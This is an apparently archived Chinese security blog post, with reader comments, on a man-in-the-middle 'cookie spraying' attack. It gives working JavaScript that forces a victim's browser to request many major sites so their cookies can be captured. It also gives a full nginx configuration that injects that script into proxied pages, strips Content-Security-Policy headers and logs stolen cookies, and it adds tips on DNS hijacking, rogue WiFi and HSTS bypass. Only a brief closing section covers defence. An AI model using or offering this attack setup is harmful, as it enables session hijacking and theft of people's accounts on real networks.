@@ -1,0 +1,101 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">中间人攻击 -- Cookie喷发</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">EtherDream</a> <span class="bull">·</span> <time title="2016/02/01 12:34" ui-time="" datetime="2016/02/01 12:34" class="published ng-binding ng-isolate-scope">2016/02/01 12:34</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>分享个中间人攻击姿势，屡试不爽。</p><p>原本<a href="http://www.cnblogs.com/index-html/p/mitm-cookie-sniffer.html">是篇老文</a>，不过写的太啰嗦。今天用简明的文字，重新讲一遍。</p><h1>0x01 原理</h1><hr><p>传统 cookie 嗅探，只能获得用户主动访问的站点。不访问就抓不到，效率很低。</p><p>如果流量可控，不如在用户访问的页面中注入一个脚本。通过脚本，就可以请求任意站点：</p><pre><code>#!js
+new Image().src = 'http://anyhost'
+</code></pre><p>因为请求头部会带上 cookie，所以能把任意站点的 cookie 骗上流量，让中间人拿到。</p><h1>0x02 爆发</h1><hr><p>首先收集各大网站域名，然后挨个来一发：</p><pre><code>#!js
+var list = ['qq.com', '163.com', 'weibo.com', ...];
+
+for (var i of list) {
+    new Image().src = 'http://' + i + '/__cookie';
+}
+</code></pre><p>这样，就能把用户各种网站的 cookie 都爆上一遍。</p><p>后端收到 <code>/__cookie</code> 请求，记录其中的 cookie，然后返回一个空内容。于是只需极小的流量，就可以测试一个站点。</p><h1>0x03 优化</h1><hr><p>因为收集了各种站点，所以需要大量的域名解析。</p><p>为了让爆破更快，可以再劫持用户的 DNS 请求，暂时解析成自己 IP，这样域名查询就不用走外网。</p><pre><code>       DNS
+     &lt;-----&gt;
+用户          中间人       外网
+     &lt;-----&gt;
+       HTTP
+</code></pre><p>同时还有个巨大的好处：整个系统不依赖外网，可以离线劫持！</p><p>比如在没互联网的地方，开一个 WiFi 就能攻击。</p><h1>0x04 演示</h1><hr><p>我们用 nginx 来演示：</p><pre><code>#!bash
+# nginx.conf
+
+http {
+    resolver            114.114.114.114;
+    ...
+
+    log_format          record_cookie '$time_iso8601 $remote_addr $http_host $http_cookie';
+
+    # 静态资源
+    server {
+        listen          8080;
+        server_name     m.io;
+        gzip            on;
+        #expires         1d;
+        root            /path/to/;
+    }
+
+    # 代理服务
+    server {
+        listen          8080 default_server;
+        server_name     _;
+        gzip            on;
+
+        location / {
+            # 请求的是 html 资源，进入劫持流程
+            if ($http_accept ~ "text/html") {
+                rewrite             ^   /__html;
+            }
+            # 其他资源，正常代理
+            proxy_pass              http://$http_host;
+        }
+
+        # 页面注入
+        location = /__html {
+            internal;
+
+            # 压缩的内容无法 sub_filter，先解压
+            proxy_set_header        host    $http_host;
+            proxy_pass              http://127.0.0.1:50000$request_uri;
+
+            # 删除 CSP 头，防止被阻挡
+            proxy_hide_header       Content-Security-Policy;
+
+            # 注入脚本
+            sub_filter              &lt;head   "&lt;script src=//m.io/cookie.js&gt;&lt;/script&gt;&lt;head";
+        }
+
+        # 记录 cookie
+        location = /__cookie {
+            access_log              /path/to/cookies.log  record_cookie;
+
+            # 设置缓存时间
+            # 避免每次访问页面，都产生大量请求（其实在 js 里判断会更好）
+            add_header              Cache-Control   "max-age=3600";
+
+            # 返回空内容
+            return                  200;
+        }
+    }
+
+    # 解压服务
+    server {
+        listen          127.0.0.1:50000;
+        gunzip          on;
+
+        location / {
+            proxy_set_header        Accept-Encoding     deflate;
+            proxy_pass              http://$host;
+        }
+    }
+}
+</code></pre><p>在 <code>/path/to</code> 目录下，放置前端攻击脚本：</p><pre><code>#!js
+// cookie.js
+
+(function(list) {
+    if (self != top) return;
+
+    list = list.split(' ');
+
+    for (var i = 0; i &lt; list.length; i++) {
+        new Image().src = 'http://' + list[i] + '/__cookie';
+    }
+})(
+    // 目标站点列表
+    '163.com qq.com weibo.com'
+)
+</code></pre><p>把浏览器的 HTTP 代理设成 127.0.0.1:8080，就可以演示了。</p><p>打开任意 HTTP 页面，就可以爆出用户的各种 Cookie：</p><p><img alt="p1" img-src="bca8ab4e07c4b6615f63cbd4b6292700bfb9faae.jpg"></p><p><img alt="p2" img-src="c0196918f724c607c7a87b40c4872535af81506c.jpg"></p><p>实战方式有很多，能控制流量就行。比如 ARP 攻击、钓鱼 WiFi、钓鱼代理，或者<a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/">劫持小区 PPPoE 网络</a>，等等。</p><h1>0x05 防范</h1><hr><p>其实和 JSONP 隐私泄露类似，关闭浏览器「第三方 cookie」即可。</p><p>三方 cookie 百害而无一利，隐私泄露的罪魁祸首。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/501" rel="bookmark" id="re1">CVE-2012-0053详解</a></li><li><a href="http://drops.wooyun.org/papers/4505" rel="bookmark" id="re2">Perl数据类型安全研究【翻译】</a></li><li><a href="http://drops.wooyun.org/papers/3993" rel="bookmark" id="re3">CVE-2014-1806 .NET Remoting Services漏洞浅析</a></li><li><a href="http://drops.wooyun.org/papers/4762" rel="bookmark" id="re4">linux symbolic link attack tutorial</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2016-02-15 08:11:06</span></div><p></p><p>@小手冰凉 奇技淫巧。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">都是流氓</span> <span class="reply-time">2016-02-15 00:43:23</span></div><p></p><p>要是后段系统做了唯一身份识别呢，就算你拿到cookies你又怎</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">EtherDream</span> <span class="reply-time">2016-02-14 19:50:46</span></div><p></p><p>是 HSTS 头</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">EtherDream</span> <span class="reply-time">2016-02-14 19:46:26</span></div><p></p><p>@。。。写漏了一段。。。要爆出 https 站点的 cookie 必须：(1) 没设置 secure 属性 (2) 网站没开启 HTST 头。如果开启了 HTST 但没设置 includeSubDomains 参数，可以尝试请求这个站的子域（不存在也没事，中间人可以伪造 DNS 响应），请求里也能包含上级域的 cookie。（当然，上级域不能在 Public Suffix List 里，否则 cookie 是隔离的）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">barretlee</span> <span class="reply-time">2016-02-14 17:40:10</span></div><p></p><p>点个赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ANONYMOUS</span> <span class="reply-time">2016-02-14 17:34:33</span></div><p></p><p>学了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">。。。</span> <span class="reply-time">2016-02-11 09:12:52</span></div><p></p><p>HTTPS呢。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tai7sy</span> <span class="reply-time">2016-02-03 10:44:17</span></div><p></p><p>@XXChacha 这就要看DNS的劫持方式了, 是你修改了用户的DNS, 还是拿下了用户所使用的那台DNS服务器. 如果是第二种,这种方法确实很不错. 第一种就......</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">XXChacha</span> <span class="reply-time">2016-02-02 20:35:51</span></div><p></p><p>@Tai7sy 直接获取只能等用户主动访问了某站才能取某站的cookie，这个方法的意义是可以一次性获取所有大站cookie。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cnh4ckff</span> <span class="weibo"></span> <span class="reply-time">2016-02-02 15:36:47</span></div><p></p><p>很棒的思路！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小手冰凉</span> <span class="reply-time">2016-02-02 14:02:39</span></div><p></p><p>@Tai7sy 哈哈 我说呢，怪不得读着那么不顺嘴，还是你懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rambo</span> <span class="reply-time">2016-02-02 11:08:51</span></div><p></p><p>12306 就是用的大量的第三方cookies 比如验证码<br>让我哭会</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tai7sy</span> <span class="reply-time">2016-02-02 09:51:14</span></div><p></p><p>不是很懂,DNS都能劫持了,<br>直接获取cookies不是更简单么....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-02-01 18:25:21</span></div><p></p><p>感谢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tai7sy</span> <span class="reply-time">2016-02-01 15:21:13</span></div><p></p><p>@小手冰凉<br>是奇技淫巧 ==</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxghost</span> <span class="weibo"></span> <span class="reply-time">2016-02-01 14:38:05</span></div><p></p><p>数据库出错啦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小手冰凉</span> <span class="reply-time">2016-02-01 14:18:25</span></div><p></p><p>奇淫技巧！</p><p></p></div></div></div></div></div></main>
